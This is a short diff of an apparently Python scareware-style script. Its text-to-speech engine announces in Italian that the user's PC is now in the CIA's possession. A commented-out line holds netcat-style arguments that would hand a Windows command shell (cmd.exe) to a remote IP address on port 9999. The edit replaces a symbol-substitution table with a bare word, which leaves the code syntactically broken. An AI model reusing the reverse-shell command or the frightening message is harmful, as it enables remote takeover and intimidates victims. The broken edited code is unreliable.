@@ -50,10 +50,7 @@ messaggi="ora il tuo pc e in possesso della cia"
 engine.runAndWait()
 engine.say(messaggi)
 symbols = {
-    'A': '|4-', 'B': '.8-.', 'C': '-0ì', 'D': '#3', 'E': '@^3£', 'F': '[4?', 'G': '!1%',
-    'H': '$=6', 'I': '+@9', 'J': '(', 'K': '^', 'L': ':', 'M': '?', 'N': ']', 'O': '<\\3',
-    'P': '>', 'Q': '%', 'R': '£', 'S': '=', 'T': '/', 'U': '_', 'V': '\\', 'W': ';',
-    'X': '°', 'Y': 'ç', 'Z': '&',
+    lenguage
 }
 #saluti="-d 216.58.204.142  9999 -e cmd.exe"
 #translated_text = ""
